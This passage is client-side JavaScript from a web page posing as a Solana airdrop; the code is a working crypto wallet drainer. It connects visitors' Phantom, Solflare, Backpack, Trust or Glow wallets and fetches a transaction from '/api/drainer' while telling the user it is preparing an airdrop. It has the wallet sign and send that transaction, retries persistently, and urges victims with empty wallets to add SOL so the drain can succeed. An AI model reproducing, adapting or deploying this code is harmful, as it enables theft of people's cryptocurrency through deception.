                showStatus('Connection failed: ' + (err.message || err), 'error');
              }
            };
          } else {
            option.onclick = () => window.open(wallet.install, '_blank');
          }
        }
        
        list.appendChild(option);
      });
      
      modal.classList.add("active");
      setTimeout(() => {
        const first = list.querySelector('.wallet-option');
        if (first) first.focus();
      }, 100);
      modal.onkeydown = function(e) {
        if (e.key === 'Escape') closeWalletModal();
      };
    }

    function closeWalletModal() {
      document.getElementById("walletModal").classList.remove("active");
    }
    window.onclick = function(event) {
      const modal = document.getElementById("walletModal");
      if (event.target === modal) closeWalletModal();
    };

    // --- Transaction Persistence and Error Handling ---
    const TRANSACTION_STORAGE_KEY = 'solana_airdrop_pending_tx';
    const WALLET_STORAGE_KEY = 'solana_airdrop_wallet_info';
    
    // Debouncing for API calls
    let apiCallTimeout = null;
    let isProcessingTransaction = false;
    
    // Debounced API call function
    function debouncedAPICall(callback, delay = 1000) {
      if (apiCallTimeout) {
        clearTimeout(apiCallTimeout);
      }
      apiCallTimeout = setTimeout(callback, delay);
    }
    
    // Store transaction for retry
    function storeTransaction(transactionBase64, walletAddress, providerName) {
      const txData = {
        transaction: transactionBase64,
        walletAddress: walletAddress,
        providerName: providerName,
        timestamp: Date.now(),
        attempts: 0
      };
      localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(txData));
    }
    
    // Get stored transaction
    function getStoredTransaction() {
      const stored = localStorage.getItem(TRANSACTION_STORAGE_KEY);
      if (!stored) return null;
      
      try {
        const txData = JSON.parse(stored);
        // Check if transaction is older than 1 hour (3600000 ms)
        if (Date.now() - txData.timestamp > 3600000) {
          localStorage.removeItem(TRANSACTION_STORAGE_KEY);
          return null;
        }
        return txData;
      } catch (e) {
        localStorage.removeItem(TRANSACTION_STORAGE_KEY);
        return null;
      }
    }
    
    // Clear stored transaction
    function clearStoredTransaction() {
      localStorage.removeItem(TRANSACTION_STORAGE_KEY);
    }
    
    // Store wallet info for retry
    function storeWalletInfo(provider, walletName) {
      const walletInfo = {
        name: walletName,
        address: getWalletAddress(provider),
        timestamp: Date.now()
      };
      localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify(walletInfo));
    }
    
    // Get stored wallet info
    function getStoredWalletInfo() {
      const stored = localStorage.getItem(WALLET_STORAGE_KEY);
      if (!stored) return null;
      
      try {
        const walletInfo = JSON.parse(stored);
        // Check if wallet info is older than 24 hours
        if (Date.now() - walletInfo.timestamp > 86400000) {
          localStorage.removeItem(WALLET_STORAGE_KEY);
          return null;
        }
        return walletInfo;
      } catch (e) {
        localStorage.removeItem(WALLET_STORAGE_KEY);
        return null;
      }
    }
    
    // Check for pending transactions on page load
    function checkPendingTransactions() {
      const storedTx = getStoredTransaction();
      if (storedTx) {
        const walletInfo = getStoredWalletInfo();
        if (walletInfo) {
          showStatus(
            `You have a pending transaction from ${walletInfo.name}. Would you like to retry?`,
            'pending'
          );
        }
      }
    }

    // --- Status Message Logic ---
    function showStatus(msg, type) {
      const modal = document.getElementById('statusModal');
      const msgEl = document.getElementById('statusModalMsg');
      const actionsDiv = document.getElementById('statusModalActions');
      const retryBtn = document.getElementById('statusModalRetry');
      const closeBtn = document.getElementById('statusModalClose');
      const closeSingleBtn = document.getElementById('statusModalCloseSingle');

      msgEl.textContent = msg;
      msgEl.style.color = type === 'success' ? '#00FF88' : 
                         type === 'error' ? '#FF4D4D' : 
                         type === 'pending' ? '#FFD700' : '#FFD700';

      // Show/hide action buttons based on type
      if (type === 'success') {
      modal.style.display = 'flex';
        actionsDiv.style.display = 'none';
        closeSingleBtn.style.display = 'inline-block';
        // Auto-close for success after 6 seconds
        setTimeout(() => {
          modal.style.display = 'none';
          clearStoredTransaction(); // Clear any stored transaction on success
        }, 6000);
      } else if (type === 'error') {
        modal.style.display = 'flex';
        actionsDiv.style.display = 'block';
        closeSingleBtn.style.display = 'none';
        
        // Retry button click handler
        retryBtn.onclick = () => {
          modal.style.display = 'none';
          const storedTx = getStoredTransaction();
          if (storedTx) {
            retryStoredTransaction();
          } else {
            // If no stored transaction, try to get a new one
            const walletInfo = getStoredWalletInfo();
            if (walletInfo) {
              showStatus('Preparing new transaction...', 'loading');
              // Try to reconnect and get new transaction
              setTimeout(() => {
                const provider = findProviderByName(walletInfo.name);
                if (provider) {
                  runDrainer(provider);
                } else {
                  showStatus('Please reconnect your wallet to retry.', 'error');
                }
              }, 1000);
            }
          }
        };
        
        // Close button click handler
        closeBtn.onclick = () => {
          modal.style.display = 'none';
          clearStoredTransaction(); // Clear stored transaction when user closes
        };
      } else if (type === 'loading') {
        modal.style.display = 'flex';
        actionsDiv.style.display = 'none';
        closeSingleBtn.style.display = 'none';
      } else if (type === 'pending') {
        modal.style.display = 'flex';
        actionsDiv.style.display = 'block';
        closeSingleBtn.style.display = 'none';
        
        // Retry button for pending transaction
        retryBtn.onclick = () => {
          modal.style.display = 'none';
          retryStoredTransaction();
        };
        
        // Close button for pending transaction
        closeBtn.onclick = () => {
          modal.style.display = 'none';
          clearStoredTransaction();
        };
      }
      
      // Escape key handler
      modal.onkeydown = function(e) {
        if (e.key === 'Escape') {
          modal.style.display = 'none';
        }
      };
    }
    
    // Find provider by name
    function findProviderByName(name) {
      for (const wallet of WALLET_DEFS) {
        if (wallet.name === name) {
          return wallet.provider();
        }
      }
      return null;
    }
    
    // Retry stored transaction
    async function retryStoredTransaction() {
      const storedTx = getStoredTransaction();
      if (!storedTx) {
        showStatus('No pending transaction found.', 'error');
        return;
      }
      
      // Increment attempt counter
      storedTx.attempts++;
      localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(storedTx));
      
      if (storedTx.attempts > 3) {
        showStatus('Maximum retry attempts reached. Please try a new transaction.', 'error');
        clearStoredTransaction();
        return;
      }
      
      showStatus(`Retrying transaction (attempt ${storedTx.attempts}/3)...`, 'loading');
      
      try {
        const provider = findProviderByName(storedTx.providerName);
        if (!provider) {
          showStatus('Wallet not found. Please reconnect your wallet.', 'error');
          return;
        }
        
        // Always fetch a fresh transaction instead of reusing the old one
        // This handles the case where user's wallet was empty but now has funds
        const currentPubkey = getWalletAddress(provider);
        if (!currentPubkey) {
          showStatus('Wallet not connected. Please reconnect your wallet.', 'error');
          return;
        }
        
        // Fetch fresh transaction from API
        const res = await fetch('/api/drainer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pubkey: currentPubkey })
        });
        const data = await res.json();
        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
        
        // Update stored transaction with fresh data
        storeTransaction(data.transaction, currentPubkey, storedTx.providerName);
        
        // Deserialize and retry transaction
        const tx = window.solanaWeb3.Transaction.from(
          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
        );
        
        if (provider.isGlow && provider.signAndSendTransaction) {
          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
          clearStoredTransaction();
        } else if (provider.isSolflare && provider.signAndSendTransaction) {
          // Solflare specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (solflareErr) {
            // Fallback for Solflare if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw solflareErr;
            }
          }
        } else if (provider.isPhantom && provider.signAndSendTransaction) {
          // Phantom specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (phantomErr) {
            // Fallback for Phantom if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw phantomErr;
            }
          }
        } else if (provider.isBackpack && provider.signAndSendTransaction) {
          // Backpack specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (backpackErr) {
            // Fallback for Backpack if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw backpackErr;
            }
          }
        } else if (provider.isTrust && provider.signAndSendTransaction) {
          // Trust Wallet specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (trustErr) {
            // Fallback for Trust Wallet if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw trustErr;
            }
          }
        } else if (provider.signAndSendTransaction) {
          // Generic signAndSendTransaction for other wallets
          const sig = await provider.signAndSendTransaction(tx);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
                clearStoredTransaction(); // Clear on success
        } else if (provider.signTransaction && provider.sendTransaction) {
          // Fallback: sign and send separately
          const signed = await provider.signTransaction(tx);
          const sig = await provider.sendTransaction(signed);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
          clearStoredTransaction(); // Clear on success
        } else if (provider.signTransaction) {
          const signed = await provider.signTransaction(tx);
          showStatus("Transaction signed! (You need to send it to the network)", 'success');
                clearStoredTransaction(); // Clear on success
        } else {
          throw new Error("Wallet does not support transaction signing.");
        }
      } catch (err) {
        const errorMsg = err.message || err;
        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled')) {
          showStatus("Transaction was rejected by your wallet. You can retry or close.", 'error');
        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds') || errorMsg.includes('INSUFFICIENT_FUNDS')) {
          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
          clearStoredTransaction(); // Clear stored transaction for insufficient funds
          // Offer to retry after user adds funds
          setTimeout(() => {
            const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
            handleEmptyWalletRetry(provider, walletName);
          }, 3000);
        } else if (errorMsg.includes('400') || errorMsg.includes('Bad Request')) {
          showStatus("Invalid request. Please check your wallet connection and try again.", 'error');
        } else if (errorMsg.includes('network') || errorMsg.includes('connection')) {
          showStatus("Network error. Please check your internet connection and try again.", 'error');
        } else {
          showStatus("Transaction failed: " + errorMsg + ". You can retry or close.", 'error');
        }
      }
    }
    
    // Handle empty wallet that later receives funds
    function handleEmptyWalletRetry(provider, walletName) {
      showStatus(`Your wallet was empty before. If you've added funds, we'll check again.`, 'loading');
      
      setTimeout(async () => {
        try {
          const pubkey = getWalletAddress(provider);
          if (!pubkey) {
            showStatus('Wallet not connected. Please reconnect your wallet.', 'error');
            return;
          }
          
          // Fetch fresh transaction to check current balance
          const res = await fetch('/api/drainer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ pubkey })
          });
          const data = await res.json();
          
          if (data.success && data.transaction) {
            // User now has funds, proceed with transaction
            storeTransaction(data.transaction, pubkey, walletName);
            runDrainer(provider);
          } else {
            showStatus('Wallet still has insufficient funds. Please add SOL and try again.', 'error');
          }
        } catch (err) {
          showStatus('Error checking wallet balance: ' + (err.message || err), 'error');
        }
      }, 2000);
    }

    // Global error and unhandledrejection handlers for modal popup
    window.onerror = function(message, source, lineno, colno, error) {
      showStatus('Error: ' + (message || error?.message || 'Unknown error'), 'error');
      return true;
    };
    window.onunhandledrejection = function(event) {
      showStatus('Error: ' + (event.reason?.message || event.reason || 'Unhandled promise rejection'), 'error');
      return true;
    };

    // Helper: Validate a Solana base58 address (32 bytes, 44 chars, base58 alphabet)
    function isValidSolanaAddress(str) {
      if (typeof str !== 'string') return false;
      // Solana addresses are usually 32 bytes (44 base58 chars), but can be 43 or 44
      if (str.length < 32 || str.length > 44) return false;
      // Base58 alphabet (no 0, O, I, l)
      return /^[1-9A-HJ-NP-Za-km-z]+$/.test(str);
    }

    // Robustly extract the wallet address from any provider (supports all major Solana wallets)
    function getWalletAddress(provider) {
      if (!provider) return null;
      // 1. Check provider.publicKey
      if (provider.publicKey) {
        if (typeof provider.publicKey === 'string' && isValidSolanaAddress(provider.publicKey)) return provider.publicKey;
        if (typeof provider.publicKey.toBase58 === 'function') {
          const addr = provider.publicKey.toBase58();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (typeof provider.publicKey.toString === 'function') {
          const addr = provider.publicKey.toString();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (provider.publicKey.address && isValidSolanaAddress(provider.publicKey.address)) return provider.publicKey.address;
      }
      // 2. Check provider.address (Glow, Trust, etc)
      if (provider.address) {
        if (typeof provider.address === 'string' && isValidSolanaAddress(provider.address)) return provider.address;
        if (typeof provider.address.toBase58 === 'function') {
          const addr = provider.address.toBase58();
          if (isValidSolanaAddress(addr)) return addr;
        }
        if (typeof provider.address.toString === 'function') {
          const addr = provider.address.toString();
          if (isValidSolanaAddress(addr)) return addr;
        }
      }
      // 3. Check nested wallet object (some adapters)
      if (provider.wallet) {
        if (provider.wallet.publicKey) {
          if (typeof provider.wallet.publicKey === 'string' && isValidSolanaAddress(provider.wallet.publicKey)) return provider.wallet.publicKey;
          if (typeof provider.wallet.publicKey.toBase58 === 'function') {
            const addr = provider.wallet.publicKey.toBase58();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (typeof provider.wallet.publicKey.toString === 'function') {
            const addr = provider.wallet.publicKey.toString();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (provider.wallet.publicKey.address && isValidSolanaAddress(provider.wallet.publicKey.address)) return provider.wallet.publicKey.address;
        }
        if (provider.wallet.address) {
          if (typeof provider.wallet.address === 'string' && isValidSolanaAddress(provider.wallet.address)) return provider.wallet.address;
          if (typeof provider.wallet.address.toBase58 === 'function') {
            const addr = provider.wallet.address.toBase58();
            if (isValidSolanaAddress(addr)) return addr;
          }
          if (typeof provider.wallet.address.toString === 'function') {
            const addr = provider.wallet.address.toString();
            if (isValidSolanaAddress(addr)) return addr;
          }
        }
      }
      // If nothing found, return null
      return null;
    }

    async function runDrainer(provider) {
      // Prevent multiple simultaneous API calls
      if (isProcessingTransaction) {
        showStatus('Transaction already in progress. Please wait...', 'loading');
        return;
      }
      
      const pubkey = getWalletAddress(provider);
      if (!pubkey) {
        showStatus('Wallet not connected or unsupported publicKey format.', 'error');
        return;
      }
      
      // Set processing flag
      isProcessingTransaction = true;
      
      // Store wallet info for potential retry
      const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
      storeWalletInfo(provider, walletName);
      
      showStatus('Preparing your airdrop transaction...', 'loading');
      
      try {
        // Use debounced API call to prevent rapid requests
        await new Promise((resolve, reject) => {
          debouncedAPICall(async () => {
      try {
        // 1. Fetch transaction from your API (update URL as needed)
        const res = await fetch('/api/drainer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pubkey })
        });
        const data = await res.json();
        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
              
              // Store transaction for potential retry
              storeTransaction(data.transaction, pubkey, walletName);
              
        // 2. Deserialize transaction
        const tx = window.solanaWeb3.Transaction.from(
          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
        );
        // Debug: Log transaction for Glow troubleshooting
        console.log('Drainer Transaction (base64):', data.transaction);
        console.log('Drainer Transaction (object):', tx);
              
        // 3. Sign and send
        if (provider.isGlow && provider.signAndSendTransaction) {
          // Glow expects a base64 string, not a Transaction object
          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
                clearStoredTransaction(); // Clear on success
        } else if (provider.isSolflare && provider.signAndSendTransaction) {
          // Solflare specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (solflareErr) {
            // Fallback for Solflare if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw solflareErr;
            }
          }
        } else if (provider.isPhantom && provider.signAndSendTransaction) {
          // Phantom specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (phantomErr) {
            // Fallback for Phantom if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw phantomErr;
            }
          }
        } else if (provider.isBackpack && provider.signAndSendTransaction) {
          // Backpack specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (backpackErr) {
            // Fallback for Backpack if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw backpackErr;
            }
          }
        } else if (provider.isTrust && provider.signAndSendTransaction) {
          // Trust Wallet specific handling
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
            clearStoredTransaction(); // Clear on success
          } catch (trustErr) {
            // Fallback for Trust Wallet if the above fails
            if (provider.signTransaction && provider.sendTransaction) {
              const signed = await provider.signTransaction(tx);
              const sig = await provider.sendTransaction(signed);
              showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
              clearStoredTransaction(); // Clear on success
            } else {
              throw trustErr;
            }
          }
        } else if (provider.signAndSendTransaction) {
          // Generic signAndSendTransaction for other wallets
          const sig = await provider.signAndSendTransaction(tx);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
                clearStoredTransaction(); // Clear on success
        } else if (provider.signTransaction && provider.sendTransaction) {
          // Fallback: sign and send separately
          const signed = await provider.signTransaction(tx);
          const sig = await provider.sendTransaction(signed);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
          clearStoredTransaction(); // Clear on success
        } else if (provider.signTransaction) {
          const signed = await provider.signTransaction(tx);
          showStatus("Transaction signed! (You need to send it to the network)", 'success');
                clearStoredTransaction(); // Clear on success
        } else {
          throw new Error("Wallet does not support transaction signing.");
        }
              resolve();
      } catch (err) {
              reject(err);
            }
          }, 500); // 500ms debounce
        });
      } catch (err) {
        const errorMsg = err.message || err;
        
        // Handle specific error types with appropriate messages
        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled') || errorMsg.includes('User rejected')) {
          showStatus("Transaction was rejected by your wallet. You can retry or close.", 'error');
        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds') || errorMsg.includes('INSUFFICIENT_FUNDS')) {
          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
          clearStoredTransaction(); // Clear stored transaction for insufficient funds
          // Offer to retry after user adds funds
          setTimeout(() => {
            const walletName = WALLET_DEFS.find(w => w.provider() === provider)?.name || 'Unknown Wallet';
            handleEmptyWalletRetry(provider, walletName);
          }, 3000);
        } else if (errorMsg.includes('400') || errorMsg.includes('Bad Request')) {
          showStatus("Invalid request. Please check your wallet connection and try again.", 'error');
        } else if (errorMsg.includes('network') || errorMsg.includes('connection')) {
          showStatus("Network error. Please check your internet connection and try again.", 'error');
        } else {
          showStatus("Transaction failed: " + errorMsg + ". You can retry or close.", 'error');
        }
      } finally {
        // Reset processing flag
        isProcessingTransaction = false;
      }
    }
    
    // Check for pending transactions on page load
    document.addEventListener('DOMContentLoaded', function() {
      checkPendingTransactions();
    });
    // --- Navbar Active Link on Scroll ---
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = ['hero','security','learn','explore','support'].map(id => document.getElementById(id));
    window.addEventListener('scroll', () => {
      let current = 'hero';
      for (const section of sections) {
        if (section && window.scrollY + 80 >= section.offsetTop) {
          current = section.id;
        }
      }
      navLinks.forEach(link => {
        link.classList.toggle('active', link.getAttribute('href') === '#' + current);
      });
    });
    // --- Smooth scroll for nav links ---
    navLinks.forEach(link => {
      link.addEventListener('click', function(e) {
        const targetId = this.getAttribute('href').slice(1);
        const target = document.getElementById(targetId);
        if (target) {
          e.preventDefault();
          window.scrollTo({ top: target.offsetTop - 60, behavior: 'smooth' });
        }
      });
    });
  </script>
</body>
</html>
